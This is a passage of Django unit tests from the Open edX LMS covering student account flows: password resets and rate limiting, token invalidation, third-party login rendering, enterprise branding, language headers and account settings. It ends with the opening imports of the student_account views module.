INVALID_KEY = u\"123abc\"\n\n    URLCONF_MODULES = ['student_accounts.urls']\n\n    ENABLED_CACHES = ['default']\n\n    def setUp(self):\n        super(StudentAccountUpdateTest, self).setUp()\n\n        # Create/activate a new account\n        activation_key = create_account(self.USERNAME, self.OLD_PASSWORD, self.OLD_EMAIL)\n        activate_account(activation_key)\n\n        # Login\n        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)\n        self.assertTrue(result)\n\n    @skipUnless(settings.ROOT_URLCONF == 'lms.urls', 'Test only valid in LMS')\n    def test_password_change(self):\n        # Request a password change while logged in, simulating\n        # use of the password reset link from the account page\n        response = self._change_password()\n        self.assertEqual(response.status_code, 200)\n\n        # Check that an email was sent\n        self.assertEqual(len(mail.outbox), 1)\n\n        # Retrieve the activation link from the email body\n        email_body = mail.outbox[0].body\n        result = re.search(r'(?P<url>https?://[^\\s]+)', email_body)\n        self.assertIsNot(result, None)\n        activation_link = result.group('url')\n\n        # Visit the activation link\n        response = self.client.get(activation_link)\n        self.assertEqual(response.status_code, 200)\n\n        # Submit a new password and follow the redirect to the success page\n        response = self.client.post(\n            activation_link,\n            # These keys are from the form on the current password reset confirmation page.\n            {'new_password1': self.NEW_PASSWORD, 'new_password2': self.NEW_PASSWORD},\n            follow=True\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertContains(response, \"Your password has been reset.\")\n\n        # Log the user out to clear session data\n        self.client.logout()\n\n        # Verify that the new password can be used to log in\n        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)\n        self.assertTrue(result)\n\n        # Try reusing the activation link to change the password again\n        # Visit the activation link again.\n        response = self.client.get(activation_link)\n        self.assertEqual(response.status_code, 200)\n        self.assertContains(response, \"This password reset link is invalid. It may have been used already.\")\n\n        self.client.logout()\n\n        # Verify that the old password cannot be used to log in\n        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)\n        self.assertFalse(result)\n\n        # Verify that the new password continues to be valid\n        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)\n        self.assertTrue(result)\n\n    @ddt.data(True, False)\n    def test_password_change_logged_out(self, send_email):\n        # Log the user out\n        self.client.logout()\n\n        # Request a password change while logged out, simulating\n        # use of the password reset link from the login page\n        if send_email:\n            response = self._change_password(email=self.OLD_EMAIL)\n            self.assertEqual(response.status_code, 200)\n        else:\n            # Don't send an email in the POST data, simulating\n            # its (potentially accidental) omission in the POST\n            # data sent from the login page\n            response = self._change_password()\n            self.assertEqual(response.status_code, 400)\n\n    def test_access_token_invalidation_logged_out(self):\n        self.client.logout()\n        user = User.objects.get(email=self.OLD_EMAIL)\n        self._create_dop_tokens(user)\n        self._create_dot_tokens(user)\n        response = self._change_password(email=self.OLD_EMAIL)\n        self.assertEqual(response.status_code, 200)\n        self.assert_access_token_destroyed(user)\n\n    def test_access_token_invalidation_logged_in(self):\n        user = User.objects.get(email=self.OLD_EMAIL)\n        self._create_dop_tokens(user)\n        self._create_dot_tokens(user)\n        response = self._change_password()\n        self.assertEqual(response.status_code, 200)\n        self.assert_access_token_destroyed(user)\n\n    def test_password_change_inactive_user(self):\n        # Log out the user created during test setup\n        self.client.logout()\n\n        # Create a second user, but do not activate it\n        create_account(self.ALTERNATE_USERNAME, self.OLD_PASSWORD, self.NEW_EMAIL)\n\n        # Send the view the email address tied to the inactive user\n        response = self._change_password(email=self.NEW_EMAIL)\n\n        # Expect that the activation email is still sent,\n        # since the user may have lost the original activation email.\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(len(mail.outbox), 1)\n\n    def test_password_change_no_user(self):\n        # Log out the user created during test setup\n        self.client.logout()\n\n        with LogCapture(LOGGER_NAME, level=logging.INFO) as logger:\n            # Send the view an email address not tied to any user\n            response = self._change_password(email=self.NEW_EMAIL)\n            self.assertEqual(response.status_code, 200)\n            logger.check((LOGGER_NAME, 'INFO', 'Invalid password reset attempt'))\n\n    def test_password_change_rate_limited(self):\n        # Log out the user created during test setup, to prevent the view from\n        # selecting the logged-in user's email address over the email provided\n        # in the POST data\n        self.client.logout()\n\n        # Make many consecutive bad requests in an attempt to trigger the rate limiter\n        for __ in xrange(self.INVALID_ATTEMPTS):\n            self._change_password(email=self.NEW_EMAIL)\n\n        response = self._change_password(email=self.NEW_EMAIL)\n        self.assertEqual(response.status_code, 403)\n\n    @ddt.data(\n        ('post', 'password_change_request', []),\n    )\n    @ddt.unpack\n    def test_require_http_method(self, correct_method, url_name, args):\n        wrong_methods = {'get', 'put', 'post', 'head', 'options', 'delete'} - {correct_method}\n        url = reverse(url_name, args=args)\n\n        for method in wrong_methods:\n            response = getattr(self.client, method)(url)\n            self.assertEqual(response.status_code, 405)\n\n    def _change_password(self, email=None):\n        \"\"\"Request to change the user's password. \"\"\"\n        data = {}\n\n        if email:\n            data['email'] = email\n\n        return self.client.post(path=reverse('password_change_request'), data=data)\n\n    def _create_dop_tokens(self, user=None):\n        \"\"\"Create dop access token for given user if user provided else for default user.\"\"\"\n        if not user:\n            user = User.objects.get(email=self.OLD_EMAIL)\n\n        client = ClientFactory()\n        access_token = AccessTokenFactory(user=user, client=client)\n        RefreshTokenFactory(user=user, client=client, access_token=access_token)\n\n    def _create_dot_tokens(self, user=None):\n        \"\"\"Create dop access token for given user if user provided else for default user.\"\"\"\n        if not user:\n            user = User.objects.get(email=self.OLD_EMAIL)\n\n        application = dot_factories.ApplicationFactory(user=user)\n        access_token = dot_factories.AccessTokenFactory(user=user, application=application)\n        dot_factories.RefreshTokenFactory(user=user, application=application, access_token=access_token)\n\n    def assert_access_token_destroyed(self, user):\n        \"\"\"Assert all access tokens are destroyed.\"\"\"\n        self.assertFalse(dot_access_token.objects.filter(user=user).exists())\n        self.assertFalse(dot_refresh_token.objects.filter(user=user).exists())\n        self.assertFalse(dop_access_token.objects.filter(user=user).exists())\n        self.assertFalse(dop_refresh_token.objects.filter(user=user).exists())\n\n\n@attr(shard=3)\n@ddt.ddt\nclass StudentAccountLoginAndRegistrationTest(ThirdPartyAuthTestMixin, UrlResetMixin, ModuleStoreTestCase):\n    \"\"\" Tests for the student account views that update the user's account information. \"\"\"\n\n    USERNAME = \"bob\"\n    EMAIL = \"bob@example.com\"\n    PASSWORD = \"password\"\n\n    URLCONF_MODULES = ['openedx.core.djangoapps.embargo']\n\n    @mock.patch.dict(settings.FEATURES, {'EMBARGO': True})\n    def setUp(self):\n        super(StudentAccountLoginAndRegistrationTest, self).setUp()\n\n        # Several third party auth providers are created for these tests:\n        self.google_provider = self.configure_google_provider(enabled=True, visible=True)\n        self.configure_facebook_provider(enabled=True, visible=True)\n        self.configure_dummy_provider(\n            visible=True,\n            enabled=True,\n            icon_class='',\n            icon_image=SimpleUploadedFile('icon.svg', '<svg><rect width=\"50\" height=\"100\"/></svg>'),\n        )\n        self.hidden_enabled_provider = self.configure_linkedin_provider(\n            visible=False,\n            enabled=True,\n        )\n        self.hidden_disabled_provider = self.configure_azure_ad_provider()\n\n    @ddt.data(\n        (\"signin_user\", \"login\"),\n        (\"register_user\", \"register\"),\n    )\n    @ddt.unpack\n    def test_login_and_registration_form(self, url_name, initial_mode):\n        response = self.client.get(reverse(url_name))\n        expected_data = '\"initial_mode\": \"{mode}\"'.format(mode=initial_mode)\n        self.assertContains(response, expected_data)\n\n    @ddt.data(\"signin_user\", \"register_user\")\n    def test_login_and_registration_form_already_authenticated(self, url_name):\n        # Create/activate a new account and log in\n        activation_key = create_account(self.USERNAME, self.PASSWORD, self.EMAIL)\n        activate_account(activation_key)\n        result = self.client.login(username=self.USERNAME, password=self.PASSWORD)\n        self.assertTrue(result)\n\n        # Verify that we're redirected to the dashboard\n        response = self.client.get(reverse(url_name))\n        self.assertRedirects(response, reverse(\"dashboard\"))\n\n    @ddt.data(\n        (None, \"signin_user\"),\n        (None, \"register_user\"),\n        (\"edx.org\", \"signin_user\"),\n        (\"edx.org\", \"register_user\"),\n    )\n    @ddt.unpack\n    def test_login_and_registration_form_signin_not_preserves_params(self, theme, url_name):\n        params = [\n            ('course_id', 'edX/DemoX/Demo_Course'),\n            ('enrollment_action', 'enroll'),\n        ]\n\n        # The response should not have a \"Sign In\" button with the URL\n        # that preserves the querystring params\n        with with_comprehensive_theme_context(theme):\n            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        expected_url = '/login?{}'.format(self._finish_auth_url_param(params + [('next', '/dashboard')]))\n        self.assertNotContains(response, expected_url)\n\n        # Add additional parameters:\n        params = [\n            ('course_id', 'edX/DemoX/Demo_Course'),\n            ('enrollment_action', 'enroll'),\n            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),\n            ('email_opt_in', 'true'),\n            ('next', '/custom/final/destination')\n        ]\n\n        # Verify that this parameter is also preserved\n        with with_comprehensive_theme_context(theme):\n            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        expected_url = '/login?{}'.format(self._finish_auth_url_param(params))\n        self.assertNotContains(response, expected_url)\n\n    @mock.patch.dict(settings.FEATURES, {\"ENABLE_THIRD_PARTY_AUTH\": False})\n    @ddt.data(\"signin_user\", \"register_user\")\n    def test_third_party_auth_disabled(self, url_name):\n        response = self.client.get(reverse(url_name))\n        self._assert_third_party_auth_data(response, None, None, [], None)\n\n    @mock.patch('student_account.views.enterprise_customer_for_request')\n    @ddt.data(\n        (\"signin_user\", None, None, None),\n        (\"register_user\", None, None, None),\n        (\"signin_user\", \"google-oauth2\", \"Google\", None),\n        (\"register_user\", \"google-oauth2\", \"Google\", None),\n        (\"signin_user\", \"facebook\", \"Facebook\", None),\n        (\"register_user\", \"facebook\", \"Facebook\", None),\n        (\"signin_user\", \"dummy\", \"Dummy\", None),\n        (\"register_user\", \"dummy\", \"Dummy\", None),\n        (\n            \"signin_user\",\n            \"google-oauth2\",\n            \"Google\",\n            {\n                'name': 'FakeName',\n                'logo': 'https://host.com/logo.jpg',\n                'welcome_msg': 'No message'\n            }\n        )\n    )\n    @ddt.unpack\n    def test_third_party_auth(\n            self,\n            url_name,\n            current_backend,\n            current_provider,\n            expected_enterprise_customer_mock_attrs,\n            enterprise_customer_mock\n    ):\n        params = [\n            ('course_id', 'course-v1:Org+Course+Run'),\n            ('enrollment_action', 'enroll'),\n            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),\n            ('email_opt_in', 'true'),\n            ('next', '/custom/final/destination'),\n        ]\n\n        if expected_enterprise_customer_mock_attrs:\n            expected_ec = mock.MagicMock(\n                branding_configuration=mock.MagicMock(\n                    logo=mock.MagicMock(\n                        url=expected_enterprise_customer_mock_attrs['logo']\n                    ),\n                    welcome_message=expected_enterprise_customer_mock_attrs['welcome_msg']\n                )\n            )\n            expected_ec.name = expected_enterprise_customer_mock_attrs['name']\n        else:\n            expected_ec = None\n\n        enterprise_customer_mock.return_value = expected_ec\n\n        # Simulate a running pipeline\n        if current_backend is not None:\n            pipeline_target = \"student_account.views.third_party_auth.pipeline\"\n            with simulate_running_pipeline(pipeline_target, current_backend):\n                response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        # Do NOT simulate a running pipeline\n        else:\n            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        # This relies on the THIRD_PARTY_AUTH configuration in the test settings\n        expected_providers = [\n            {\n                \"id\": \"oa2-dummy\",\n                \"name\": \"Dummy\",\n                \"iconClass\": None,\n                \"iconImage\": settings.MEDIA_URL + \"icon.svg\",\n                \"loginUrl\": self._third_party_login_url(\"dummy\", \"login\", params),\n                \"registerUrl\": self._third_party_login_url(\"dummy\", \"register\", params)\n            },\n            {\n                \"id\": \"oa2-facebook\",\n                \"name\": \"Facebook\",\n                \"iconClass\": \"fa-facebook\",\n                \"iconImage\": None,\n                \"loginUrl\": self._third_party_login_url(\"facebook\", \"login\", params),\n                \"registerUrl\": self._third_party_login_url(\"facebook\", \"register\", params)\n            },\n            {\n                \"id\": \"oa2-google-oauth2\",\n                \"name\": \"Google\",\n                \"iconClass\": \"fa-google-plus\",\n                \"iconImage\": None,\n                \"loginUrl\": self._third_party_login_url(\"google-oauth2\", \"login\", params),\n                \"registerUrl\": self._third_party_login_url(\"google-oauth2\", \"register\", params)\n            },\n        ]\n        self._assert_third_party_auth_data(\n            response,\n            current_backend,\n            current_provider,\n            expected_providers,\n            expected_ec\n        )\n\n    def test_hinted_login(self):\n        params = [(\"next\", \"/courses/something/?tpa_hint=oa2-google-oauth2\")]\n        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"oa2-google-oauth2\"')\n\n        tpa_hint = self.hidden_enabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"{0}\"'.format(tpa_hint))\n\n        tpa_hint = self.hidden_disabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=\"text/html\")\n        self.assertNotIn(response.content, tpa_hint)\n\n    @ddt.data(\n        ('signin_user', 'login'),\n        ('register_user', 'register'),\n    )\n    @ddt.unpack\n    def test_hinted_login_dialog_disabled(self, url_name, auth_entry):\n        \"\"\"Test that the dialog doesn't show up for hinted logins when disabled. \"\"\"\n        self.google_provider.skip_hinted_login_dialog = True\n        self.google_provider.save()\n        params = [(\"next\", \"/courses/something/?tpa_hint=oa2-google-oauth2\")]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertRedirects(\n            response,\n            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),\n            target_status_code=302\n        )\n\n    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))\n    @ddt.data(\n        'signin_user',\n        'register_user',\n    )\n    def test_settings_tpa_hinted_login(self, url_name):\n        \"\"\"\n        Ensure that settings.FEATURES['THIRD_PARTY_AUTH_HINT'] can set third_party_auth_hint.\n        \"\"\"\n        params = [(\"next\", \"/courses/something/\")]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"oa2-google-oauth2\"')\n\n        # THIRD_PARTY_AUTH_HINT can be overridden via the query string\n        tpa_hint = self.hidden_enabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"{0}\"'.format(tpa_hint))\n\n        # Even disabled providers in the query string will override THIRD_PARTY_AUTH_HINT\n        tpa_hint = self.hidden_disabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertNotIn(response.content, tpa_hint)\n\n    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))\n    @ddt.data(\n        ('signin_user', 'login'),\n        ('register_user', 'register'),\n    )\n    @ddt.unpack\n    def test_settings_tpa_hinted_login_dialog_disabled(self, url_name, auth_entry):\n        \"\"\"Test that the dialog doesn't show up for hinted logins when disabled via settings.THIRD_PARTY_AUTH_HINT. \"\"\"\n        self.google_provider.skip_hinted_login_dialog = True\n        self.google_provider.save()\n        params = [(\"next\", \"/courses/something/\")]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertRedirects(\n            response,\n            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),\n            target_status_code=302\n        )\n\n    @mock.patch('student_account.views.enterprise_customer_for_request')\n    @ddt.data(\n        ('signin_user', False, None, None, None),\n        ('register_user', False, None, None, None),\n        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),\n        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),\n        ('signin_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),\n        ('register_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),\n        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),\n        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),\n        ('signin_user', True, 'Fake EC', None, None),\n        ('register_user', True, 'Fake EC', None, None),\n    )\n    @ddt.unpack\n    def test_enterprise_register(self, url_name, ec_present, ec_name, logo_url, welcome_message, mock_get_ec):\n        \"\"\"\n        Verify that when an EnterpriseCustomer is received on the login and register views,\n        the appropriate sidebar is rendered.\n        \"\"\"\n        if ec_present:\n            mock_ec = mock_get_ec.return_value\n            mock_ec.name = ec_name\n            if logo_url:\n                mock_ec.branding_configuration.logo.url = logo_url\n            else:\n                mock_ec.branding_configuration.logo = None\n            if welcome_message:\n                mock_ec.branding_configuration.welcome_message = welcome_message\n            else:\n                del mock_ec.branding_configuration.welcome_message\n        else:\n            mock_get_ec.return_value = None\n\n        response = self.client.get(reverse(url_name), HTTP_ACCEPT=\"text/html\")\n\n        enterprise_sidebar_div_id = u'enterprise-content-container'\n\n        if not ec_present:\n            self.assertNotContains(response, text=enterprise_sidebar_div_id)\n        else:\n            self.assertContains(response, text=enterprise_sidebar_div_id)\n            if not welcome_message:\n                welcome_message = settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE\n            expected_message = welcome_message.format(\n                start_bold=u'<b>',\n                end_bold=u'</b>',\n                enterprise_name=ec_name,\n                platform_name=settings.PLATFORM_NAME\n            )\n            self.assertContains(response, expected_message)\n            if logo_url:\n                self.assertContains(response, logo_url)\n\n    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)\n    def test_microsite_uses_old_login_page(self):\n        # Retrieve the login page from a microsite domain\n        # and verify that we're served the old page.\n        resp = self.client.get(\n            reverse(\"signin_user\"),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertContains(resp, \"Log into your Test Site Account\")\n        self.assertContains(resp, \"login-form\")\n\n    def test_microsite_uses_old_register_page(self):\n        # Retrieve the register page from a microsite domain\n        # and verify that we're served the old page.\n        resp = self.client.get(\n            reverse(\"register_user\"),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertContains(resp, \"Register for Test Site\")\n        self.assertContains(resp, \"register-form\")\n\n    def test_login_registration_xframe_protected(self):\n        resp = self.client.get(\n            reverse(\"register_user\"),\n            {},\n            HTTP_REFERER=\"http://localhost/iframe\"\n        )\n\n        self.assertEqual(resp['X-Frame-Options'], 'DENY')\n\n        self.configure_lti_provider(name='Test', lti_hostname='localhost', lti_consumer_key='test_key', enabled=True)\n\n        resp = self.client.get(\n            reverse(\"register_user\"),\n            HTTP_REFERER=\"http://localhost/iframe\"\n        )\n\n        self.assertEqual(resp['X-Frame-Options'], 'ALLOW')\n\n    def _assert_third_party_auth_data(self, response, current_backend, current_provider, providers, expected_ec):\n        \"\"\"Verify that third party auth info is rendered correctly in a DOM data attribute. \"\"\"\n        finish_auth_url = None\n        if current_backend:\n            finish_auth_url = reverse(\"social:complete\", kwargs={\"backend\": current_backend}) + \"?\"\n\n        auth_info = {\n            \"currentProvider\": current_provider,\n            \"providers\": providers,\n            \"secondaryProviders\": [],\n            \"finishAuthUrl\": finish_auth_url,\n            \"errorMessage\": None,\n        }\n        if expected_ec is not None:\n            # If we set an EnterpriseCustomer, third-party auth providers ought to be hidden.\n            auth_info['providers'] = []\n        auth_info = dump_js_escaped_json(auth_info)\n\n        expected_data = '\"third_party_auth\": {auth_info}'.format(\n            auth_info=auth_info\n        )\n\n        self.assertContains(response, expected_data)\n\n    def _third_party_login_url(self, backend_name, auth_entry, login_params):\n        \"\"\"Construct the login URL to start third party authentication. \"\"\"\n        return u\"{url}?auth_entry={auth_entry}&{param_str}\".format(\n            url=reverse(\"social:begin\", kwargs={\"backend\": backend_name}),\n            auth_entry=auth_entry,\n            param_str=self._finish_auth_url_param(login_params),\n        )\n\n    def _finish_auth_url_param(self, params):\n        \"\"\"\n        Make the next=... URL parameter that indicates where the user should go next.\n\n        >>> _finish_auth_url_param([('next', '/dashboard')])\n        '/account/finish_auth?next=%2Fdashboard'\n        \"\"\"\n        return urlencode({\n            'next': '/account/finish_auth?{}'.format(urlencode(params))\n        })\n\n    def test_english_by_default(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\")\n\n        self.assertEqual(response['Content-Language'], 'en')\n\n    def test_unsupported_language(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\", HTTP_ACCEPT_LANGUAGE=\"ts-zx\")\n\n        self.assertEqual(response['Content-Language'], 'en')\n\n    def test_browser_language(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\", HTTP_ACCEPT_LANGUAGE=\"es\")\n\n        self.assertEqual(response['Content-Language'], 'es-419')\n\n    def test_browser_language_dialent(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\", HTTP_ACCEPT_LANGUAGE=\"es-es\")\n\n        self.assertEqual(response['Content-Language'], 'es-es')\n\n\nclass AccountSettingsViewTest(ThirdPartyAuthTestMixin, TestCase, ProgramsApiConfigMixin):\n    \"\"\" Tests for the account settings view. \"\"\"\n\n    USERNAME = 'student'\n    PASSWORD = 'password'\n    FIELDS = [\n        'country',\n        'gender',\n        'language',\n        'level_of_education',\n        'password',\n        'year_of_birth',\n        'preferred_language',\n        'time_zone',\n    ]\n\n    @mock.patch(\"django.conf.settings.MESSAGE_STORAGE\", 'django.contrib.messages.storage.cookie.CookieStorage')\n    def setUp(self):\n        super(AccountSettingsViewTest, self).setUp()\n        self.user = UserFactory.create(username=self.USERNAME, password=self.PASSWORD)\n        CommerceConfiguration.objects.create(cache_ttl=10, enabled=True)\n        self.client.login(username=self.USERNAME, password=self.PASSWORD)\n\n        self.request = HttpRequest()\n        self.request.user = self.user\n\n        # For these tests, two third party auth providers are enabled by default:\n        self.configure_google_provider(enabled=True, visible=True)\n        self.configure_facebook_provider(enabled=True, visible=True)\n\n        # Python-social saves auth failure notifcations in Django messages.\n        # See pipeline.get_duplicate_provider() for details.\n        self.request.COOKIES = {}\n        MessageMiddleware().process_request(self.request)\n        messages.error(self.request, 'Facebook is already in use.', extra_tags='Auth facebook')\n\n    def test_context(self):\n\n        context = account_settings_context(self.request)\n\n        user_accounts_api_url = reverse(\"accounts_api\", kwargs={'username': self.user.username})\n        self.assertEqual(context['user_accounts_api_url'], user_accounts_api_url)\n\n        user_preferences_api_url = reverse('preferences_api', kwargs={'username': self.user.username})\n        self.assertEqual(context['user_preferences_api_url'], user_preferences_api_url)\n\n        for attribute in self.FIELDS:\n            self.assertIn(attribute, context['fields'])\n\n        self.assertEqual(\n            context['user_accounts_api_url'], reverse(\"accounts_api\", kwargs={'username': self.user.username})\n        )\n        self.assertEqual(\n            context['user_preferences_api_url'], reverse('preferences_api', kwargs={'username': self.user.username})\n        )\n\n        self.assertEqual(context['duplicate_provider'], 'facebook')\n        self.assertEqual(context['auth']['providers'][0]['name'], 'Facebook')\n        self.assertEqual(context['auth']['providers'][1]['name'], 'Google')\n\n    def test_view(self):\n        \"\"\"\n        Test that all fields are  visible\n        \"\"\"\n        view_path = reverse('account_settings')\n        response = self.client.get(path=view_path)\n\n        for attribute in self.FIELDS:\n            self.assertIn(attribute, response.content)\n\n    def test_header_with_programs_listing_enabled(self):\n        \"\"\"\n        Verify that tabs header will be shown while program listing is enabled.\n        \"\"\"\n        self.create_programs_config()\n        view_path = reverse('account_settings')\n        response = self.client.get(path=view_path)\n\n        self.assertContains(response, '<li class=\"tab-nav-item\">')\n\n    def test_header_with_programs_listing_disabled(self):\n        \"\"\"\n        Verify that nav header will be shown while program listing is disabled.\n        \"\"\"\n        self.create_programs_config(enabled=False)\n        view_path = reverse('account_settings')\n        response = self.client.get(path=view_path)\n\n        self.assertContains(response, '<li class=\"item nav-global-01\">')\n\n    def test_commerce_order_detail(self):\n        \"\"\"\n        Verify that get_user_orders returns the correct order data.\n        \"\"\"\n        with mock_get_orders():\n            order_detail = get_user_orders(self.user)\n\n        for i, order in enumerate(mock_get_orders.default_response['results']):\n            expected = {\n                'number': order['number'],\n                'price': order['total_excl_tax'],\n                'order_date': 'Jan 01, 2016',\n                'receipt_url': '/checkout/receipt/?order_number=' + order['number'],\n                'lines': order['lines'],\n            }\n            self.assertEqual(order_detail[i], expected)\n\n    def test_commerce_order_detail_exception(self):\n        with mock_get_orders(exception=exceptions.HttpNotFoundError):\n            order_detail = get_user_orders(self.user)\n\n        self.assertEqual(order_detail, [])\n\n    def test_incomplete_order_detail(self):\n        response = {\n            'results': [\n                factories.OrderFactory(\n                    status='Incomplete',\n                    lines=[\n                        factories.OrderLineFactory(\n                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory()])\n                        )\n                    ]\n                )\n            ]\n        }\n        with mock_get_orders(response=response):\n            order_detail = get_user_orders(self.user)\n\n        self.assertEqual(order_detail, [])\n\n    def test_order_history_with_no_product(self):\n        response = {\n            'results': [\n                factories.OrderFactory(\n                    lines=[\n                        factories.OrderLineFactory(\n                            product=None\n                        ),\n                        factories.OrderLineFactory(\n                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory(\n                                name='certificate_type',\n                                value='verified'\n                            )])\n                        )\n                    ]\n                )\n            ]\n        }\n        with mock_get_orders(response=response):\n            order_detail = get_user_orders(self.user)\n\n        self.assertEqual(len(order_detail), 1)\n\n\n@override_settings(SITE_NAME=settings.MICROSITE_LOGISTRATION_HOSTNAME)\nclass MicrositeLogistrationTests(TestCase):\n    \"\"\"\n    Test to validate that microsites can display the logistration page\n    \"\"\"\n\n    def test_login_page(self):\n        \"\"\"\n        Make sure that we get the expected logistration page on our specialized\n        microsite\n        \"\"\"\n\n        resp = self.client.get(\n            reverse('signin_user'),\n            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertIn('<div id=\"login-and-registration-container\"', resp.content)\n\n    def test_registration_page(self):\n        \"\"\"\n        Make sure that we get the expected logistration page on our specialized\n        microsite\n        \"\"\"\n\n        resp = self.client.get(\n            reverse('register_user'),\n            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertIn('<div id=\"login-and-registration-container\"', resp.content)\n\n    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)\n    def test_no_override(self):\n        \"\"\"\n        Make sure we get the old style login/registration if we don't override\n        \"\"\"\n\n        resp = self.client.get(\n            reverse('signin_user'),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertNotIn('<div id=\"login-and-registration-container\"', resp.content)\n\n        resp = self.client.get(\n            reverse('register_user'),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertNotIn('<div id=\"login-and-registration-container\"', resp.content)\n\n\nclass AccountCreationTestCaseWithSiteOverrides(SiteMixin, TestCase):\n    \"\"\"\n    Test cases for Feature flag ALLOW_PUBLIC_ACCOUNT_CREATION which when\n    turned off disables the account creation options in lms\n    \"\"\"\n\n    def setUp(self):\n        \"\"\"Set up the tests\"\"\"\n        super(AccountCreationTestCaseWithSiteOverrides, self).setUp()\n\n        # Set the feature flag ALLOW_PUBLIC_ACCOUNT_CREATION to False\n        self.site_configuration_values = {\n            'ALLOW_PUBLIC_ACCOUNT_CREATION': False\n        }\n        self.site_domain = 'testserver1.com'\n        self.set_up_site(self.site_domain, self.site_configuration_values)\n\n    def test_register_option_login_page(self):\n        \"\"\"\n        Navigate to the login page and check the Register option is hidden when\n        ALLOW_PUBLIC_ACCOUNT_CREATION flag is turned off\n        \"\"\"\n        response = self.client.get(reverse('signin_user'))\n        self.assertNotIn('<a class=\"btn-neutral\" href=\"/register?next=%2Fdashboard\">Register</a>',\n                         response.content)\n/n/n/nlms/djangoapps/student_account/views.py/n/n\"\"\" Views for a student's account information. \"\"\"\n\nimport json\nimport logging\nimport urlparse\nfrom datetime import datetime\n\nimport pytz\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth.decorators import login_required\nfrom django.core.urlresolvers import resolve, reverse\nfrom django.http import HttpRequest, HttpResponse, HttpResponseBadRequest, HttpResponseForbidden\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\nfrom django.views.decorators.csrf import ensure_csrf_cookie\nfrom django.views.decorators.http import require_http_methods\nfrom django_countries import countries\n\nimport third_party_auth\nfrom commerce.models import CommerceConfiguration\nfrom edxmako.shortcuts import render_to_response, render_to_string\nfrom lms.djangoapps.commerce.utils import EcommerceService\nfrom openedx.core.djangoapps.commerce.utils import ecommerce_api_client\nfrom openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login\nfrom openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register\nfrom openedx.core.djangoapps.lang_pref.api import all_languages, released_languages\nfrom openedx.core.djangoapps.programs.models import ProgramsApiConfig\nfrom 